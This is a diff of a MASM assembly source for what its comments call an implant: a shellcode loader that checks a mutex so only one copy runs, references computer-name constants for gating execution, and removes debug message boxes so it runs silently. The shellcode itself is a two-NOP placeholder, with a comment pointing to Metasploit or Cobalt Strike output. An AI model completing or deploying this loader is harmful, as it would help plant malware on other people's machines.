@@ -33,18 +33,17 @@ GetComputerInfo PROTO :DWORD
 
 
 .data                              
+  ; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
+  strMutexName  db  "Global\Stufus",0    
 
-  strMutexName  db  "Global\Stufus",0    ; The mutex name. "Local\" means per session. "Global\" means per system.
-  strYesRun db "Yes, run",0
-  strNo db "No, already running",0
-
-  ; Had to work this out from https://msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
+  ; Had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
   ; and some experimentation
   CNF_ComputerNamePhysicalNetBIOS           equ 4
   CNF_ComputerNamePhysicalDnsHostname       equ 5
   CNF_ComputerNamePhysicalDnsDomain         equ 6
   CNF_ComputerNamePhysicalDnsFullyQualified equ 7
 
+  ; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
   shellcode db 90h,90h
   
 .data?
@@ -79,9 +78,9 @@ CheckExecution PROC uses esi
     
     invoke MutexCheck ; Check to see whether the implant is already running or not
     .if eax==NULL
-        invoke MessageBox, NULL, addr strNo, NULL, NULL
+        nop
     .else
-        invoke MessageBox, NULL, addr strYesRun, NULL, NULL
+        nop
     .endif
     ret
     
